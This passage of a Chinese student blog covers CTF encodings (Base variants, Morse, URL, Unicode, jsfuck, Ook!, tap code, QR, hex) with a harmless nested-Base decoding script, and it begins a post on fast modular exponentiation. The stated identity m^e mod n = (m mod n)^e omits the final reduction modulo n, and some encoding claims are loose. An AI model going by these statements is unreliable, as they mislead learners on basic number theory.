<p>a）二个字节的情况：将这二个字节的一共16个二进制位，按照上面的规则，转成三组，最后一组除了前面加两个0以外，后面也要加两个0。这样得到一个三位的Base64编码，再在末尾补上一个”=”号。<br>比如，“Ma”这个字符串是两个字节，可以转化成三组00010011、00010110、00010000以后，对应Base64值分别为T、W、E，再补上一个”=“号，因此”Ma”的Base64编码就是TWE=。<br>b）一个字节的情况：将这一个字节的8个二进制位，按照上面的规则转成二组，最后一组除了前面加二个0以外，后面再加4个0。这样得到一个二位的Base64编码，再在末尾补上两个”=”号。<br>比如，“M”这个字母是一个字节，可以转化为二组00010011、00010000，对应的Base64值分别为T、Q，再补上二个”=”号，因此”M”的Base64编码就是TQ==。</p>
</blockquote>
<p>6位2进制能表示的最大数是2的6次方是64，所以base64就是64个字符(A-Z，a-z，0-9，+，/这64个编码字符，注意=不属于编码字符，而是填充字符)，下面是张转换后数值的对应字符表</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210207201509345.png" alt="Base64对照表格"></p>
<h3 id="Base32"><a href="#Base32" class="headerlink" title="Base32"></a>Base32</h3><p>Base32编码是使用32个可打印字符（字母A-Z和数字2-7）对任意字节数据进行编码的方案，编码后的字符串不用区分大小写并排除了容易混淆的字符，可以方便地由人类使用并由计算机处理<br>tips：末尾最多有6个=</p>
<h3 id="Base16"><a href="#Base16" class="headerlink" title="Base16"></a>Base16</h3><p>Base16使用数字0-9和字母A-F共计16个ASCII可打印字符对任意字节数据进行编码<br>tips：不会出现=</p>
<h3 id="Base36"><a href="#Base36" class="headerlink" title="Base36"></a>Base36</h3><p>Base36包含0~9的数字，加上所有26个字母，不区分大小写，不包含任何标点，所有的字母要不全大写，要不全小写。所以加起来就是 “0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ”,或者“0123456789abcdefghijklmnopqrstuvwxyz”<br>tips：编码仅支持整数数字，解密仅支持字符串，不支持中文<br>所以Base64，Base32，Base16都是支持对中文编码的</p>
<h3 id="Base58"><a href="#Base58" class="headerlink" title="Base58"></a>Base58</h3><p>“123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ”，从这不难看出，Base58是纯数字与字母组成而且去掉了容易引起视觉混淆的字符（0：数字零，O：大写O，I：大写i，l:小写L）。9个数字+49个字母=58个。<br>tips：Base58不使用数字”0”，字母大写”O”，字母大写”I”，和字母小写”l”，以及”+”和”/”符号</p>
<h3 id="Base62"><a href="#Base62" class="headerlink" title="Base62"></a>Base62</h3><p>Base62编码，由62字符（0-9，a-z，A-Z）组成<br>相比于base64只是去掉了两个符号（+和/）<br>不支持中文</p>
<h3 id="Base85"><a href="#Base85" class="headerlink" title="Base85"></a>Base85</h3><p>Base85是一种类似于Base64的二进制文本编码形式，通过使用五个ascii字符来表示四个字节的二进制数据。<br>好像国内有关这一方面的资料比较少，好像就是用ascii码来编码字符吧，所以它的字符范围比Base64广。当然也有其实际的用途。<br>不支持中文</p>
<h3 id="Base91"><a href="#Base91" class="headerlink" title="Base91"></a>Base91</h3><p>Base91由91个字符（0-9，a-z，A-Z,!#$%&amp;()*+,./:;&lt;=&gt;?@[]^_`{|}”~）组成<br>不支持中文</p>
<h3 id="Base92"><a href="#Base92" class="headerlink" title="Base92"></a>Base92</h3><p>比Base91 多一个字符 〜<br>支持中文。<br>最后这里附上一个脚本，用来解决base套娃，之前的题目也遇到过，不过好像base64库里只有16，32，64和85</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time : 2021/1/27 10:39</span></span><br><span class="line"><span class="comment"># @Author : Will</span></span><br><span class="line"><span class="comment"># @File : basefamily(script).py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = base64.b64decode(s)</span><br><span class="line">        s = base(s)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            s = base64.b32decode(s)</span><br><span class="line">            s = base(s)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                s = base64.b16decode(s)</span><br><span class="line">                s = base(s)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    s = base64.b85decode(s)</span><br><span class="line">                    s = base(s)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;base.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    text = f.read()</span><br><span class="line">    a = base(text)</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># @Author : JJ</span></span><br><span class="line"><span class="comment"># from base64 import *</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># def decode(string):</span></span><br><span class="line"><span class="comment">#     while 1:</span></span><br><span class="line"><span class="comment">#         try:</span></span><br><span class="line"><span class="comment">#             str= b64decode(string).decode()</span></span><br><span class="line"><span class="comment">#             print(&quot;b64decode&#x27;s result is :&quot;, str)</span></span><br><span class="line"><span class="comment">#             str = b85decode(string).decode()</span></span><br><span class="line"><span class="comment">#             print(&quot;b85decode&#x27;s result is :&quot;, str)</span></span><br><span class="line"><span class="comment">#             str = (b16decode(string)).decode()</span></span><br><span class="line"><span class="comment">#             print(&quot;b16decode&#x27;s result is :&quot;, str)</span></span><br><span class="line"><span class="comment">#             str = b32decode(string).decode()</span></span><br><span class="line"><span class="comment">#             print(&quot;b32decode&#x27;s result is :&quot;, str)</span></span><br><span class="line"><span class="comment">#         except:</span></span><br><span class="line"><span class="comment">#             pass</span></span><br><span class="line"><span class="comment">#         finally:</span></span><br><span class="line"><span class="comment">#             print(&quot;decoding end&quot;)</span></span><br><span class="line"><span class="comment"># with open(&#x27;base.txt&#x27;, &#x27;r&#x27;) as f:</span></span><br><span class="line"><span class="comment">#    string = f.read()</span></span><br><span class="line"><span class="comment"># # decode(f,string)</span></span><br><span class="line"><span class="comment"># while 1:</span></span><br><span class="line"><span class="comment">#     decode(string)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Morse码"><a href="#Morse码" class="headerlink" title="Morse码"></a>Morse码</h2><p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210208103335656.png" alt="Morse"></p>
<h2 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h2><p>Shellcode为16进制的机器码，一串\x加一个十六进制数字组成，解密的方式就是用十六进制数字去查ascii码表，实现编码解码的脚本也简单的，有工具偷懒了</p>
<h2 id="Urlencode"><a href="#Urlencode" class="headerlink" title="Urlencode"></a>Urlencode</h2><p>url编码又叫百分号编码，是统一资源定位(URL)编码方式。<br>URL地址（常说网址）规定了常用的数字，字母可以直接使用，另外一批作为特殊用户字符也可以直接用（/,:@等），剩下的其它所有字符必须通过%xx编码处理。<br>编码方法很简单，在该字节ascii码的16进制字符前面加%<br>如空格字符，ascii码是32，对应16进制是’20’，那么urlencode编码结果是：%20</p>
<h2 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h2><p>Unicode，中文又称万国码、国际码、统一码、单一码，是计算机科学领域的业界标准。它整理、编码了世界上大部分的文字系统，使得电脑可以用更为简单的方式来呈现和处理文字。 Unicode伴随着通用字符集的标准而发展，同时也以书本的形式对外发表。Unicode至今仍在不断增修，每个新版本都加入更多新的字符。<br>主要有两格式（其实不止），不要不认识了</p>
<ol>
<li>\u4e39\u4e39\u5b66\u59d0\u4e07\u5c81\uff01</li>
<li>第二种形式有点不友好？<img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210208121609199.png" alt="明明就">本地、在线的工具都不是很兼容，随便信息搜索一个网站就可以用<br><a href="http://tool.chinaz.com/Tools/unicode.aspx">站长</a></li>
</ol>
<h2 id="aaencode、jjencode、uuencode"><a href="#aaencode、jjencode、uuencode" class="headerlink" title="aaencode、jjencode、uuencode"></a>aaencode、jjencode、uuencode</h2><h3 id="aaencode"><a href="#aaencode" class="headerlink" title="aaencode"></a>aaencode</h3><p>人家是不过是可爱的颜文字，可以在console中直接执行</p>
<h3 id="jjencode"><a href="#jjencode" class="headerlink" title="jjencode"></a>jjencode</h3><p>也可以在console中直接执行，特点是有()[]{}!+,&#39;‘$.:;_~=，好像还有什么全局变量</p>
<h3 id="uuencode"><a href="#uuencode" class="headerlink" title="uuencode"></a>uuencode</h3><p>Uuencode是二进制信息和文字信息之间的转换编码，也就是机器和人眼识读的转换。Uuencode编码方案常见于电子邮件信息的传输，目前已被多用途互联网邮件扩展（MIME）大量取代。</p>
<h2 id="jsfuck、brainfuck、Ook"><a href="#jsfuck、brainfuck、Ook" class="headerlink" title="jsfuck、brainfuck、Ook!"></a>jsfuck、brainfuck、Ook!</h2><h3 id="jsfuck"><a href="#jsfuck" class="headerlink" title="jsfuck"></a>jsfuck</h3><p>只有六个字符 () [] ! +<br>就能写js</p>
<h3 id="brainfuck"><a href="#brainfuck" class="headerlink" title="brainfuck"></a>brainfuck</h3><p>只有八个字符 &lt;&gt; + - . , []</p>
<h3 id="Ook"><a href="#Ook" class="headerlink" title="Ook!"></a>Ook!</h3><p>比较常见，有两种格式</p>
<ol>
<li>Ook!</li>
</ol>
<blockquote>
<p>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook?<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook?<br>Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook! Ook. Ook?<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook?<br>Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook!<br>Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook.<br>Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook?<br>Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook!<br>Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook.<br>Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook.<br>Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!<br>Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook!<br>Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook?<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!<br>Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook!<br>Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook.<br>Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!<br>Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook!<br>Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook.<br>Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook.</p>
</blockquote>
<ol start="2">
<li>Short ook!</li>
</ol>
<blockquote>
<p>….. ….. ….. ….. ….. ….. !?!!. ?…. ….. ….. ….. …..<br>….. .?.?! .?… …!. ?…. ….. ….! ?!!.? !!!!! !!!!! !!?.? !.?!!<br>!!!!! !!!!! !!!!! …!. ?…. ….. ….! ?!!.? ….. ….. ..?.? !.?..<br>….. ….. ..!.? ….. ….. …!? !!.?! !!!!! !!!!! !?.?! .?!!! !!!!!<br>!!!!! !!!!. ..!.? ….. ….. …!? !!.?. ….. ….. .?.?! .?… …..<br>….. …!. ?…. ….. ….. .!?!! .?!!! !!!!! !!!!! !?.?! .?!!! !!!!!<br>!!!!! !!.!! !!!!! !!!!! !!!.? ….. ….. ….. !?!!. ?…. ….. …..<br>?.?!. ?…. ….. ….. ….. ….. ….! .?… ….. ….. ..!?! !.?!!<br>!!!!! !!!!! !!?.? !.?!! !!!!! !!!!! !!!!! !!!!! !!!!! .?… ….. .!?!!<br>.?!!! !!!!! ?.?!. ?!!!! !!!!! !!!!! !.?.. ….. ….. ….. ..!?! !.?..<br>….. ….. ….. .?.?! .?… …!. ?…. ….. ….! ?!!.? !!!!! !!!!!<br>!!?.? !.?!! !!!!! !!!!! !!!!! .?… ….. ….. ..!?! !.?!! !!!!! !!!!!<br>!!?.? !.?!. ?…. ….. ….. ….. !?!!. ?…. ….. ….. ….? .?!.?<br>….. ….. ….. ….. ….. .!.?. ….. ….. ….! ?!!.? !!!!! !!!!!<br>!!!!? .?!.? !!!!! .?… ….. ….. ..!?! !.?!! !!!!! !!!!! !!?.? !.?!.<br>?…. ….. ….. ….. ..!?! !.?.. ….. ….. ….. …?. ?!.?. …..<br>….. ….. ….! .?… ….. ….. ..!?! !.?!! !!!!! !!!!! !!?.? !.?!!<br>!!!.? ….. ….. ….. !?!!. ?!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!!!!<br>!!!!! !!.?.</p>
</blockquote>
<p>在线网站解君愁<a href="https://www.splitbrain.org/services/ook">Brainfuck之Ook!</a></p>
<h2 id="敲击码"><a href="#敲击码" class="headerlink" title="敲击码"></a>敲击码</h2><p>敲击码（Tap code）是一种以非常简单的方式对文本信息进行编码的方法。<br>因该编码对信息通过使用一系列的点击声音来编码而命名，敲击码是基于 5 ×5 方格波利比奥斯方阵来实现的，不同点是是用 K 字母被整合到 C 中。</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210208135632771.png" alt="Tap Code"></p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/2021020813580737.png" alt="栗子"></p>
<p>可以使用离线的工具，在线的感觉有bug</p>
<h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h2><p>二维码是一大个大类</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210208142655971.png" alt="在这里插入图片描述"></p>
<ul>
<li>堆叠式 / 行排式二维码又称堆积式二维条码或层排式二维条码，其编码原理是建立在一维条码基础之上，按需要堆积成二行或多行。 Code 16 k、Code 49、PDF417</li>
<li>矩阵式二维码：QR CODE</li>
</ul>
<h3 id="矩阵式二维码"><a href="#矩阵式二维码" class="headerlink" title="矩阵式二维码"></a>矩阵式二维码</h3><p> 最流行莫过于QR CODE ,我们常说的二维码就是它了。矩阵式二维条码（又称棋盘式二维条码）它是在一个矩形空间通过黑、白像素在矩阵中的不同分布进行编码。在矩阵相应元素位置上，用点（方点、圆点或其他形状）的出现表示二进制“1”，点的不出现表示二进制的“0”，点的排列组合确定了矩阵式二维条码所代表的意义。矩阵式二维条码是建立在计算机图像处理技术、组合编码原理等基础上的一种新型图形符号自动识读处理码制。具有代表性的矩阵式二维条码有：Code One、MaxiCode、QR Code、 Data Matrix、Han Xin Code、Grid Matrix 等。</p>
<ul>
<li>QR码的特点</li>
</ul>
<ol>
<li><p>QR(Quick-Response) code是被广泛使用的一种二维码，解码速度快。</p>
</li>
<li><p>存储大容量信息：传统的条形码只能处理20位左右的信息量，与此相比，QR码可处理条形码的几十倍到几百倍的信息量。</p>
</li>
<li><p>QR码还可以支持所有类型的数据（如：数字、英文字母、日文字母、汉字、符号、二进制、控制码等）。一个QR码最多可以处理7089字(仅用数字时)的巨大信息量。</p>
</li>
<li><p>在小空间内打印：QR码使用纵向和横向两个方向处理数据，如果是相同的信息量，QR码所占空间为条形码的十分之一左右。(还支持Micro QR码，可以在更小空间内处理数据。)</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210208143030240.png" alt="还能更省"></p>
</li>
</ol>
<ul>
<li><p>QR码的基本结构</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210208143204928.png" alt="QR码"></p>
<p>格式信息：纠错等级<br>版本信息：即二维码的规格，QR码符号共有40种规格的矩阵</p>
</li>
</ul>
<p>然后看到师傅用的一个github里的项目，<a href="https://github.com/Sssddcc/qrazybox">手撕二维码</a>的，感觉挺有意思</p>
<h2 id="HEX编码"><a href="#HEX编码" class="headerlink" title="HEX编码"></a>HEX编码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">字符串：                    4XWi11</span><br><span class="line">ASCII码：                  [<span class="number">52</span>, <span class="number">88</span>, <span class="number">87</span>, <span class="number">105</span>, <span class="number">49</span>, <span class="number">49</span>]</span><br><span class="line">二进制码：                  00110100 01011000 01010111 01101001 00110001 00110001</span><br><span class="line">重新分组：                  0011 0100 0101 <span class="number">1000</span> 0101 0111 0110 <span class="number">1001</span> 0011 0001 0011 0001</span><br><span class="line">高位补零后的二进制码：      00000011 00000100 00000101 00001000 00000101 00000111 00000110 00001001 00000011 00000001 00000011 00000001</span><br><span class="line">十六进制码：                       <span class="number">3</span>        <span class="number">4</span>        <span class="number">5</span>        <span class="number">8</span>        <span class="number">5</span>        <span class="number">7</span>        <span class="number">6</span>        <span class="number">9</span>        <span class="number">3</span>        <span class="number">1</span>        <span class="number">3</span>        <span class="number">1</span></span><br><span class="line">Hex码：                    <span class="number">345857693131</span></span><br></pre></td></tr></table></figure>

<p>当然HEX有多种形式，数字是一样的，注意不要不认识了</p>
<h1 id="稀奇古怪的编码"><a href="#稀奇古怪的编码" class="headerlink" title="稀奇古怪的编码"></a>稀奇古怪的编码</h1><p>有他们各自独特的算法吧，可能是别人的一些项目，可以信息搜索到在线解密，重要的是注意积累吧。</p>
<h2 id="社会主义核心价值观编码"><a href="#社会主义核心价值观编码" class="headerlink" title="社会主义核心价值观编码"></a>社会主义核心价值观编码</h2><h2 id="与佛论禅"><a href="#与佛论禅" class="headerlink" title="与佛论禅"></a>与佛论禅</h2><h2 id="与熊论道"><a href="#与熊论道" class="headerlink" title="与熊论道"></a>与熊论道</h2><p>以上就是师傅课堂里涉及到的全部编码，这里无脑地全部摘下来，但正如博客中间提到的，重要的是自己遇到和积累的。所以想要写一篇博客持续更新，记录我在打ctf路上，遇到的那些编码以及加密。</p>
]]></content>
      <categories>
        <category>杂项</category>
      </categories>
  </entry>
  <entry>
    <title>快速幂算法详解</title>
    <url>/posts/59b3d960/</url>
    <content><![CDATA[<p>快速幂，懂了我就屁哦大不溜</p>
<span id="more"></span>

<p>开始前先展示成果，这是我用python脚本实现的快速幂取模的函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">************************************************</span></span><br><span class="line"><span class="string">* Fast Power                                   *</span></span><br><span class="line"><span class="string">* RSA                                          *</span></span><br><span class="line"><span class="string">************************************************</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从左往右</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">l_pow_mod</span>(<span class="params">m, e, n</span>):</span></span><br><span class="line">    t_bin = <span class="built_in">bin</span>(e)[<span class="number">2</span>:]</span><br><span class="line">    <span class="comment"># 避免没有进入循环直接得出答案的情况</span></span><br><span class="line">    ans = m % n</span><br><span class="line">    <span class="comment"># 第一个数肯定为1，但是不平方</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> t_bin[<span class="number">1</span>:]:</span><br><span class="line">        ans = ans ** <span class="number">2</span> % n</span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            ans = ans * m % n</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从右往左，还有点不理解</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">r_pow_mod</span>(<span class="params">m, e, n</span>):</span></span><br><span class="line">    t_bin = <span class="built_in">bin</span>(e)[<span class="number">2</span>:][::-<span class="number">1</span>]</span><br><span class="line">    ans = <span class="number">1</span></span><br><span class="line">    t = m % n</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> t_bin:</span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            ans = ans * t % n</span><br><span class="line">        t = t ** <span class="number">2</span> % n</span><br><span class="line">    <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure>

<h1 id="快速幂算法详解"><a href="#快速幂算法详解" class="headerlink" title="快速幂算法详解"></a>快速幂算法详解</h1><p>密码学课上学到了快速幂取模运算，多次遇到快速幂（或者说快速指数算法）了，课上的内容还有一部分不懂，主要是从右向左那种不太会。之前也听到师傅说这个是密码学的基础算法，就好好研究一下。看到一篇<a href="https://blog.csdn.net/qq_19782019/article/details/85621386">大佬博客</a>，写得还比较详细，先研究下他的。</p>
<h2 id="研究大佬博客"><a href="#研究大佬博客" class="headerlink" title="研究大佬博客"></a>研究大佬博客</h2><img alt="快速幂算法-0e94aed2.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/快速幂算法-0e94aed2.png" width="" height="">

<p>博客到这里为止，前面都只是这条数论公式的应用（好耶，我的latex居中了）<br>$$<br>m^e\ mod\ n=(m\ mod\ n)^e<br>$$</p>
<p>避免了中间很大的结果，而是每次都框定在m的<strong>完全剩余系</strong>里面。的确，在一定程度上减轻了计算的压力</p>
<p>但是显然，如果e和n比较大，那么这个方法还是很低效的</p>
<h3 id="快速幂"><a href="#快速幂" class="headerlink" title="快速幂"></a>快速幂</h3><p>那么快速幂算法或者又被叫做快速指数算法、平方·乘算法，就从根本上解决了中间运算结果很大的问题</p>
<p>它的原理，在大佬的博客里已经被讲解得十分透彻了</p>
<img alt="快速幂算法-22df6845.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/快速幂算法-22df6845.png" width="" height="">

